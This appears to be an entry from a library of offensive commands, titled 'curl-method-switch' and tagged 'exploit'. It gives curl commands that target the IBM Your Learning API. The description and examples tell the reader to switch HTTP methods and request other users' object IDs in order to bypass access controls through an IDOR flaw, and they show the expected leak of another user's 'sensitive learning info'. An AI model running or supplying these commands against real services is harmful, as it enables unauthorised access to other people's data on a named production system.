---
id: cmd-uuid-9012
data: >-
  curl -X METHOD -H "Authorization: Bearer your-token"
  "https://yourlearning.ibm.com/api/learning/objects/object-id" -v
tags:
  - web
  - http
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:34.134Z'
verified: false
validated: true
submitted: true
---
# curl-method-switch

## Command

```bash
curl -X METHOD -H "Authorization: Bearer your-token" "https://yourlearning.ibm.com/api/learning/objects/object-id" -v
```

## Description

This curl command sends an HTTP request to the IBM Your Learning endpoint with a specified method (e.g., GET, POST) to test or exploit IDOR by switching methods. Use it to bypass access controls on object references. Replace METHOD with GET for bypass, object-id with a target ID, and your-token with a valid auth token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X METHOD` | Specifies the HTTP method (e.g., GET, POST, PUT) | Yes |
| `-H "Authorization: Bearer your-token"` | Authentication header with bearer token | Yes |
| `URL` | Target endpoint with object ID | Yes |
| `-v` | Verbose mode for debugging headers and status | No |
| `-d '{}'` | Optional data payload for POST/PUT (use empty JSON for testing) | No |

## Examples

### Basic Usage

```bash
curl -X GET -H "Authorization: Bearer your-token" "https://yourlearning.ibm.com/api/learning/objects/other-user-id" -v
```

### Advanced Usage

```bash
curl -X GET -H "Authorization: Bearer your-token" -H "Content-Type: application/json" "https://yourlearning.ibm.com/api/learning/objects/other-user-id" | jq '.'
```

## Expected Output

On success (bypassed access), a 200 OK response with JSON data like {"id": "other-user-id", "data": "sensitive learning info"}. Verbose mode shows full request/response details. Failure yields 403 Forbidden without bypass.

## Related

- [[Related Procedure: Bypass-IDOR-via-HTTP-Method-Switch]]
